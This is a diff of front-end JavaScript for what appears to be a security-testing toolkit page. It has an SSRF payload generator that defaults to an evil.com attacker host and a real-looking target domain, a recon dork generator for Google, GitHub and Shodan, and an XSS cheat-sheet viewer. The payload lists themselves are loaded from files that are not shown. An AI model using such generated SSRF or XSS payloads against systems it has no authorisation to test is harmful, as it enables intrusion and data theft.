+      return ssrfFilteredUrls.length ? `Copy All (${ssrfFilteredUrls.length})` : 'Copy All';
+    }
+
+    function renderSSRF() {
+      const allowed = $('ssrfAllowed').value || 'reservation.walibi.nl';
+      const attacker = $('ssrfAttacker').value || 'evil.com';
+      const filter = $('ssrfFilter').value.toLowerCase();
+      const resultsEl = $('ssrfResults');
+      const statsEl = $('ssrfStats');
+
+      if (!window.SSRF_PAYLOADS) {
+        resultsEl.innerHTML = '<div class="item muted">Failed to load ssrf-payloads.js</div>';
+        return;
+      }
+
+      let html = '';
+      ssrfFilteredUrls = [];
+      ssrfGroups = [];
+
+      window.SSRF_PAYLOADS.forEach(group => {
+        let groupHtml = '';
+        const groupUrls = [];
+
+        (group.payloads || []).forEach(p => {
+          if (filter) {
+            const desc = (p.description || '').toLowerCase();
+            const tags = (p.tags || []).join(' ').toLowerCase();
+            if (!desc.includes(filter) && !tags.includes(filter)) return;
+          }
+
+          let pl = (p.payload || '').replace(/<allowed>/g, allowed).replace(/<attacker>/g, attacker);
+          const fullUrl = (p.prefix || '') + pl + (p.suffix || '');
+          const idx = ssrfFilteredUrls.length;
+          ssrfFilteredUrls.push(fullUrl);
+          groupUrls.push(fullUrl);
+
+          // data-i indexes ssrfFilteredUrls; copy is handled by delegation below so we
+          // never inline-escape payloads (which broke on quotes / backslashes / newlines).
+          groupHtml += `<div class="item" style="display:flex; justify-content:space-between; align-items:flex-start; gap:10px;">
+            <div style="word-break: break-all;">
+              <code style="color:var(--text); font-size:14px; display:block; margin-bottom:4px">${escapeHTML(fullUrl)}</code>
+              <span class="muted" style="font-size:11px">${escapeHTML(p.description || 'No description')}</span>
+            </div>
+            <button class="btn ghost ssrf-copy-one" data-i="${idx}" style="padding:4px 8px; font-size:11px; flex-shrink:0">Copy</button>
+          </div>`;
+        });
+
+        if (groupUrls.length) {
+          const gi = ssrfGroups.length;
+          ssrfGroups.push({ name: group.name, urls: groupUrls });
+          html += `<div style="padding: 8px; background: rgba(123,139,255,.05); border-bottom: 1px solid var(--border); position: sticky; top: 0; z-index: 10; display:flex; justify-content:space-between; align-items:center; gap:10px;">
+            <span><b style="color:var(--accent)">${escapeHTML(group.name)}</b> <span class="muted">(${groupUrls.length})</span></span>
+            <button class="btn ghost ssrf-copy-group" data-g="${gi}" style="padding:3px 8px; font-size:10px; flex-shrink:0">Copy group</button>
+          </div>` + groupHtml;
+        }
+      });
+
+      resultsEl.innerHTML = html || '<div class="item muted">No payloads found.</div>';
+      statsEl.textContent = `${ssrfFilteredUrls.length} payload(s) generated.`;
+      $('ssrfCopyAll').textContent = ssrfCopyAllLabel();
+    }
+
+    // Single delegated handler for per-payload and per-group copy (survives re-renders).
+    $('ssrfResults').addEventListener('click', (e) => {
+      const one = e.target.closest('.ssrf-copy-one');
+      if (one) {
+        const url = ssrfFilteredUrls[+one.dataset.i];
+        if (url != null) ssrfCopyText(url).then(() => ssrfFlashBtn(one, 'Copied', 'Copy')).catch(() => ssrfFlashBtn(one, 'Copy failed', 'Copy'));
+        return;
+      }
+      const grp = e.target.closest('.ssrf-copy-group');
+      if (grp) {
+        const urls = (ssrfGroups[+grp.dataset.g] || {}).urls || [];
+        if (urls.length) ssrfCopyText(urls.join('\n')).then(() => ssrfFlashBtn(grp, `Copied ${urls.length}`, 'Copy group')).catch(() => ssrfFlashBtn(grp, 'Copy failed', 'Copy group'));
+      }
+    });
+
+    $('ssrfCopyAll').addEventListener('click', function () {
+      if (!ssrfFilteredUrls.length) return;
+      const btn = this;
+      ssrfCopyText(ssrfFilteredUrls.join('\n')).then(() => {
+        btn.textContent = `Copied ${ssrfFilteredUrls.length}!`;
+        setTimeout(() => { btn.textContent = ssrfCopyAllLabel(); }, 1800);
+      }).catch(() => {
+        // Clipboard denied (e.g. missing iframe clipboard-write permission) — surface
+        // it instead of failing silently, which is exactly what broke this button.
+        btn.textContent = 'Copy failed — check permissions';
+        setTimeout(() => { btn.textContent = ssrfCopyAllLabel(); }, 2500);
+      });
+    });
+
+    $('ssrfGenerate').addEventListener('click', renderSSRF);
+    $('ssrfFilter').addEventListener('input', renderSSRF);
+    if (window.SSRF_PAYLOADS) renderSSRF();
+
+    // ─────────────────────────────────────────────
+    //  Recon Dorks (client-side search-engine dork generator)
+    // ─────────────────────────────────────────────
+    (function () {
+      if (!window.DORKS_DB) return;
+      const DORKS = window.DORKS_DB;
+      const SEV_ORDER = ['critical', 'high', 'medium', 'low', 'info'];
+      const SEV_LABEL = { critical: 'Critical', high: 'High', medium: 'Medium', low: 'Low', info: 'Info / Recon' };
+      const BADGE_CLASS = { google: 'bg-google', github: 'bg-github', shodan: 'bg-shodan', wayback: 'bg-wayback', crtsh: 'bg-crtsh', censys: 'bg-censys', urlscan: 'bg-urlscan', fofa: 'bg-fofa', grep: 'bg-grep', intx: 'bg-intx' };
+
+      let target = 'example.com';
+      let filterText = '';
+      const activeSevs = new Set(SEV_ORDER);
+      let visibleQueries = [];
+
+      function sanitize(raw) {
+        if (!raw) return 'example.com';
+        return raw.replace(/^https?:\/\//i, '').replace(/\/.*$/, '').replace(/[^a-zA-Z0-9.\-_]/g, '') || 'example.com';
+      }
+      // google queries become a Google search URL; every other platform's query is already a full URL.
+      function buildUrl(d, t) {
+        const q = d.query.replace(/\{T\}/g, t);
+        if ((d.platforms || []).includes('google') && !/^https?:/i.test(q)) {
+          return 'https://www.google.com/search?q=' + encodeURIComponent(q);
+        }
+        return q;
+      }
+      function copyAllLabel() { return visibleQueries.length ? `Copy All (${visibleQueries.length})` : 'Copy All'; }
+
+      function renderQuick(t) {
+        const e = encodeURIComponent(t);
+        $('dorkQuick').innerHTML = [
+          ['🔍 Google site:', `https://www.google.com/search?q=site%3A${e}`],
+          ['🐙 GitHub Code', `https://github.com/search?q=%22${e}%22&type=code`],
+          ['🛰️ Shodan', `https://www.shodan.io/search?query=hostname%3A%22${e}%22`],
+          ['📜 crt.sh', `https://crt.sh/?q=%25.${e}`],
+          ['🔭 URLScan', `https://urlscan.io/search/#domain%3A${e}`],
+          ['🏛️ Wayback', `https://web.archive.org/cdx/search/cdx?url=*.${e}/*&output=text&fl=original&collapse=urlkey`],
+          ['🔬 Censys', `https://search.censys.io/search?resource=hosts&q=dns.names%3A${e}`],
+          ['🛡️ Sec Headers', `https://securityheaders.com/?q=${e}&followRedirects=on`],
+          ['🕶️ IntelX', `https://intelx.io/?s=${e}`],
+          ['🐞 OpenBugBounty', `https://www.openbugbounty.org/search/?search=${e}`],
+          ['📄 PublicWWW', `https://publicwww.com/websites/%22${e}%22/`],
+        ].map(([label, url]) => `<a href="${escapeHTML(url)}" target="_blank" rel="noopener">${label}</a>`).join('');
+      }
+
+      function render() {
+        const c = $('dorkResults');
+        const ft = filterText.toLowerCase();
+        let html = '';
+        let total = 0;
+        visibleQueries = [];
+        for (const sev of SEV_ORDER) {
+          if (!activeSevs.has(sev)) continue;
+          const list = (DORKS[sev] || []).filter(d => !ft || d.title.toLowerCase().includes(ft) || d.query.toLowerCase().includes(ft));
+          if (!list.length) continue;
+          total += list.length;
+          html += `<div class="dork-sec-head"><span class="dork-dot dot-${sev}"></span><h3 class="sev-${sev}">${SEV_LABEL[sev]}</h3><span class="dork-sec-count">${list.length} dork${list.length !== 1 ? 's' : ''}</span></div><div class="dork-grid">`;
+          for (const d of list) {
+            const q = d.query.replace(/\{T\}/g, target);
+            const url = buildUrl(d, target);
+            const idx = visibleQueries.length;
+            visibleQueries.push(q);
+            const badges = (d.platforms || []).map(p => `<span class="dork-badge ${BADGE_CLASS[p] || 'bg-google'}">${escapeHTML(p)}</span>`).join(' ');
+            html += `<a href="${escapeHTML(url)}" target="_blank" rel="noopener" class="dork-card">
+              <div class="dt"><span>${escapeHTML(d.icon || '🔎')}</span>${escapeHTML(d.title)}</div>
+              <div class="dq">${escapeHTML(q)}</div>
+              <div class="df"><span>${badges}</span><button class="dork-copy" data-i="${idx}">copy</button></div>
+            </a>`;
+          }
+          html += `</div>`;
+        }
+        c.innerHTML = html || '<div class="item muted">No dorks match the current filter.</div>';
+        $('dorkStats').textContent = `${total} dork(s) for ${target}`;
+        $('dorkCopyAll').textContent = copyAllLabel();
+      }
+
+      function applyTarget() {
+        target = sanitize($('dorkTarget').value);
+        $('dorkTarget').value = target;
+        render();
+        renderQuick(target);
+      }
+
+      $('dorkApply').addEventListener('click', applyTarget);
+      $('dorkTarget').addEventListener('keypress', e => { if (e.key === 'Enter') applyTarget(); });
+      $('dorkFilter').addEventListener('input', e => { filterText = e.target.value.trim(); render(); });
+
+      $('dorkSevFilter').querySelectorAll('.dork-sev-btn').forEach(btn => {
+        btn.addEventListener('click', () => {
+          const s = btn.dataset.sev;
+          if (s === 'all') {
+            const allOn = activeSevs.size === SEV_ORDER.length;
+            SEV_ORDER.forEach(x => { if (allOn) activeSevs.delete(x); else activeSevs.add(x); });
+          } else if (activeSevs.has(s)) { activeSevs.delete(s); } else { activeSevs.add(s); }
+          $('dorkSevFilter').querySelectorAll('.dork-sev-btn').forEach(b => {
+            const bs = b.dataset.sev;
+            b.classList.toggle('active', bs === 'all' ? activeSevs.size === SEV_ORDER.length : activeSevs.has(bs));
+          });
+          render();
+        });
+      });
+
+      // Per-card copy (delegated; prevents the card link from opening).
+      $('dorkResults').addEventListener('click', e => {
+        const btn = e.target.closest('.dork-copy');
+        if (!btn) return;
+        e.preventDefault();
+        e.stopPropagation();
+        const q = visibleQueries[+btn.dataset.i];
+        if (q != null) ssrfCopyText(q).then(() => ssrfFlashBtn(btn, '✓', 'copy')).catch(() => ssrfFlashBtn(btn, '✗', 'copy'));
+      });
+
+      $('dorkCopyAll').addEventListener('click', function () {
+        if (!visibleQueries.length) return;
+        const btn = this;
+        ssrfCopyText(visibleQueries.join('\n')).then(() => {
+          btn.textContent = `Copied ${visibleQueries.length}!`;
+          setTimeout(() => { btn.textContent = copyAllLabel(); }, 1800);
+        }).catch(() => {
+          btn.textContent = 'Copy failed — check permissions';
+          setTimeout(() => { btn.textContent = copyAllLabel(); }, 2500);
+        });
+      });
+
+      render();
+      renderQuick(target);
+    })();
+
+    // ─────────────────────────────────────────────
+    //  XSS Cheat Sheet
+    // ─────────────────────────────────────────────
+    let xssAutoOn = true;
+    let xssManualOn = true;
+    let xssFilteredPayloads = [];
+
+    function initXSS() {
+      if (!window.XSS_PAYLOADS) {
+        $('xssResults').innerHTML = '<div class="item muted" style="padding:20px">Failed to load xss-payloads.js</div>';
+        return;
+      }
+      // Populate tag filter
+      const tags = [...new Set(window.XSS_PAYLOADS.map(p => p.tag).filter(Boolean))].sort();
+      const tagSel = $('xssTagFilter');
+      tags.forEach(t => { const o = document.createElement('option'); o.value = t; o.textContent = '<' + t + '>'; tagSel.appendChild(o); });
+
+      // Populate event filter
+      const events = [...new Set(window.XSS_PAYLOADS.map(p => p.event).filter(Boolean))].sort();
+      const evSel = $('xssEventFilter');
+      events.forEach(e => { const o = document.createElement('option'); o.value = e; o.textContent = e; evSel.appendChild(o); });
+
+      renderXSS();
+    }
+
+    function renderXSS() {
+      const search = ($('xssSearch').value || '').toLowerCase();
+      const tagF = $('xssTagFilter').value;
+      const evF = $('xssEventFilter').value;
+
+      xssFilteredPayloads = window.XSS_PAYLOADS.filter(p => {
+        if (!xssAutoOn && !p.userInteraction) return false;
+        if (!xssManualOn && p.userInteraction) return false;
+        if (tagF && p.tag !== tagF) return false;
+        if (evF && p.event !== evF) return false;
+        if (search) {
+          const hay = (p.code + ' ' + p.description + ' ' + p.event + ' ' + p.tag).toLowerCase();
+          if (!hay.includes(search)) return false;
+        }
+        return true;
+      });
+
+      const statsText = search ? `${xssFilteredPayloads.length} payload(s) matching "${escapeHTML(search)}"` : `${xssFilteredPayloads.length} payload(s) of ${window.XSS_PAYLOADS.length} total`;
+      $('xssStats').textContent = statsText;
+
+      const container = $('xssResults');
+      // Clear safely — no innerHTML involved
+      while (container.firstChild) container.removeChild(container.firstChild);
+
+      if (!xssFilteredPayloads.length) {
+        const empty = document.createElement('div');
+        empty.className = 'item muted';
+        empty.style.padding = '20px';
+        empty.textContent = 'No payloads match the current filters.';
+        container.appendChild(empty);
+        return;
+      }
+
+      // Group by event
+      const grouped = {};
+      xssFilteredPayloads.forEach((p, globalIdx) => {
+        const grp = p.event || 'Other';
+        if (!grouped[grp]) grouped[grp] = [];
+        grouped[grp].push({ p, globalIdx });
+      });
+
+      const sortedGroups = Object.keys(grouped).sort();
+
+      sortedGroups.forEach(grp => {
+        const items = grouped[grp];
+
+        // --- Group header (safe: only event name + count, no payload data) ---
+        const header = document.createElement('div');
+        header.className = 'xss-group-header';
+
+        const nameSpan = document.createElement('span');
+        nameSpan.className = 'xss-group-name';
+        nameSpan.textContent = grp;                   // safe: event name only
+        header.appendChild(nameSpan);
+
+        const countSpan = document.createElement('span');
+        countSpan.className = 'xss-count-badge';
+        countSpan.textContent = `${items.length} payload${items.length > 1 ? 's' : ''}`;
+        header.appendChild(countSpan);
+        container.appendChild(header);
+
+        items.forEach(({ p, globalIdx }) => {
+          // --- Row ---
+          const row = document.createElement('div');
+          row.className = 'xss-row';
+
+          const left = document.createElement('div');
+          left.style.cssText = 'flex:1;min-width:0';
+
+          // Meta badges
+          const meta = document.createElement('div');
+          meta.className = 'xss-meta';
+
+          if (p.event) {
+            const evBadge = document.createElement('span');
+            evBadge.className = 'xss-event';
+            evBadge.textContent = p.event;            // safe: event name
+            meta.appendChild(evBadge);
+          }
+          if (p.tag) {
+            const tagBadge = document.createElement('span');
+            tagBadge.className = 'xss-tag';
+            tagBadge.textContent = '<' + p.tag + '>';  // safe: tag name
+            meta.appendChild(tagBadge);
+          }
+          const uiClass = p.userInteraction ? 'manual' : 'auto';
+          const uiLabel = p.userInteraction ? ' User Interaction' : ' Auto-fire';
+          const uiBadge = document.createElement('span');
+          uiBadge.className = 'xss-ui ' + uiClass;
+          uiBadge.textContent = uiLabel;               // safe: static string
+          meta.appendChild(uiBadge);
+          left.appendChild(meta);
+
+          // Code block — use textContent, NEVER innerHTML
+          const pre = document.createElement('pre');
+          pre.className = 'xss-code';
+          pre.textContent = p.code;                   // ← KEY: textContent prevents execution
+          left.appendChild(pre);
+
+          if (p.description) {
+            const desc = document.createElement('div');
+            desc.className = 'xss-desc';
+            desc.textContent = p.description;          // safe: textContent
+            left.appendChild(desc);
+          }
+
+          row.appendChild(left);
+
+          // Copy button — stores index, reads from xssFilteredPayloads at click time
+          const copyBtn = document.createElement('button');
+          copyBtn.className = 'xss-copy-btn';
+          copyBtn.textContent = 'Copy';
+          copyBtn.dataset.idx = globalIdx;             // store index, NOT the payload string
+          copyBtn.addEventListener('click', function() {
+            const payload = xssFilteredPayloads[parseInt(this.dataset.idx, 10)];
+            if (!payload) return;
+            navigator.clipboard.writeText(payload.code).then(() => {
+              this.textContent = ' Copied!';
+              setTimeout(() => { this.textContent = 'Copy'; }, 1500);
+            }).catch(() => {
+              // Fallback for non-https
+              const ta = document.createElement('textarea');
+              ta.value = payload.code;
+              ta.style.cssText = 'position:fixed;opacity:0';
+              document.body.appendChild(ta);
+              ta.select();
+              document.execCommand('copy');
+              document.body.removeChild(ta);
+              this.textContent = '';
+              setTimeout(() => { this.textContent = 'Copy'; }, 1500);
+            });
+          });
+          row.appendChild(copyBtn);
+          container.appendChild(row);
+        });
+      });
+    }
+
+    $('xssSearch').addEventListener('input', renderXSS);
+    $('xssTagFilter').addEventListener('change', renderXSS);
+    $('xssEventFilter').addEventListener('change', renderXSS);
+
+    $('xssToggleAuto').addEventListener('click', function() {
+      xssAutoOn = !xssAutoOn;
+      this.classList.toggle('on', xssAutoOn);
+      renderXSS();
+    });
+    $('xssToggleManual').addEventListener('click', function() {
+      xssManualOn = !xssManualOn;
+      this.classList.toggle('on', xssManualOn);
+      renderXSS();
+    });
+
+    $('xssCopyAll').addEventListener('click', function() {
+      if (!xssFilteredPayloads.length) return;
+      const btn = this;
+      const text = xssFilteredPayloads.map(p => p.code).join('\n\n');
+      // ssrfCopyText (defined above) falls back to execCommand on non-secure
+      // contexts and never leaves a rejected promise unhandled.
+      ssrfCopyText(text).then(() => {
+        btn.textContent = ' Copied ' + xssFilteredPayloads.length + ' payloads!';
+        setTimeout(() => btn.textContent = ' Copy All Visible', 2000);
+      }).catch(() => {
+        btn.textContent = ' Copy failed — check permissions';
+        setTimeout(() => btn.textContent = ' Copy All Visible', 2500);
+      });
+    });
+
+    // Init XSS when tab is activated
+    document.querySelectorAll('.tab').forEach(btn => {
+      btn.addEventListener('click', () => {
+        if (btn.dataset.tab === 'xss' && window.XSS_PAYLOADS && !$('xssTagFilter').children.length > 1) {
+          initXSS();
+        }
+      });
+    });
+    // Pre-init on load
+    if (window.XSS_PAYLOADS) initXSS();
+  </script>
+  <script src="takeover-reference.js"></script>
+</body>
+</html>
